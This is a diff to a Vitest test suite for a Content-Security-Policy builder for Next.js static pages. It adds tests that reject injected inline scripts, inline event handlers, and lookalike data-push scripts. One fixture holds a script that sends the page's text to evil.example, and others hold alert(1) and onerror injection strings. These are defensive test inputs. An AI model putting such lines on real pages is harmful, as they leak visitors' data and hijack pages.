@@ -1,6 +1,13 @@
 import { createHash } from "node:crypto";
 import { describe, expect, it } from "vitest";
-import { applyCsp, buildPolicy, inlineScripts, scriptHash, verifyCsp } from "../csp.mjs";
+import {
+  ALLOWED_INLINE_SCRIPT,
+  applyCsp,
+  buildPolicy,
+  inlineScripts,
+  scriptHash,
+  verifyCsp,
+} from "../csp.mjs";
 
 /** A trimmed-down page in the shape `next build` exports. */
 const page = (extraHead = "", body = "") =>
@@ -58,7 +65,7 @@ describe("applyCsp", () => {
       ].join(" "),
     );
     expect(policy).toContain("default-src 'none'");
-    expect(policy).toContain("form-action 'none'");
+    expect(policy).toContain("form-action 'self'");
     expect(policy).toContain("base-uri 'none'");
     expect(policy).not.toMatch(/unsafe-inline|unsafe-eval|strict-dynamic|\*/);
   });
@@ -67,6 +74,13 @@ describe("applyCsp", () => {
     const once = applyCsp(page());
     expect(applyCsp(once)).toBe(once);
     expect(once.match(/Content-Security-Policy/g)).toHaveLength(1);
+  });
+
+  it("refuses to allow an inline script that isn't Next.js page data", () => {
+    const injected = page("<script>fetch('https://evil.example/?'+document.body.innerText)</script>");
+    expect(() => applyCsp(injected)).toThrow(/unexpected inline script/);
+    const lookalike = page('<script>self.__next_f.push([1,"x"]);alert(1)</script>');
+    expect(() => applyCsp(lookalike)).toThrow(/unexpected inline script/);
   });
 
   it("refuses a page without a charset declaration to anchor to", () => {
@@ -80,14 +94,43 @@ describe("verifyCsp", () => {
     expect(() => verifyCsp(html)).toThrow(/isn't covered/);
   });
 
-  it("rejects inline styles the policy would block", () => {
+  it("rejects inline styles and event handlers the policy would block", () => {
     expect(() => verifyCsp(applyCsp(page("<style>body{margin:0}</style>")))).toThrow(/inline styles/);
     expect(() => verifyCsp(applyCsp(page("", '<h1 style="color:red">x</h1>')))).toThrow(
       /inline styles/,
+    );
+    expect(() => verifyCsp(applyCsp(page("", '<img src="x.png" onerror="go()">')))).toThrow(
+      /event handlers/,
     );
   });
 
   it("rejects a page without the policy", () => {
     expect(() => verifyCsp(page())).toThrow(/no Content-Security-Policy/);
+  });
+});
+
+describe("ALLOWED_INLINE_SCRIPT", () => {
+  it("matches Next.js's bootstrap and page-data scripts", () => {
+    expect(ALLOWED_INLINE_SCRIPT.test("(self.__next_f=self.__next_f||[]).push([0])")).toBe(true);
+    expect(ALLOWED_INLINE_SCRIPT.test('self.__next_f.push([1,"a\\"b\\n\\u003c"])')).toBe(true);
+  });
+
+  it("rejects anything that runs more than a data push", () => {
+    for (const body of [
+      'self.__next_f.push([1,"x"]);alert(1)',
+      'self.__next_f.push([1,"x"+alert(1)+"y"])',
+      'self.__next_f.push([1,"unterminated])',
+      "alert(1)",
+      "",
+    ]) {
+      expect(ALLOWED_INLINE_SCRIPT.test(body), body).toBe(false);
+    }
+  });
+
+  it("handles a large page-data payload quickly", () => {
+    const big = `self.__next_f.push([1,"${'x\\"'.repeat(200_000)}"])`;
+    const started = performance.now();
+    expect(ALLOWED_INLINE_SCRIPT.test(big)).toBe(true);
+    expect(performance.now() - started).toBeLessThan(500);
   });
 });
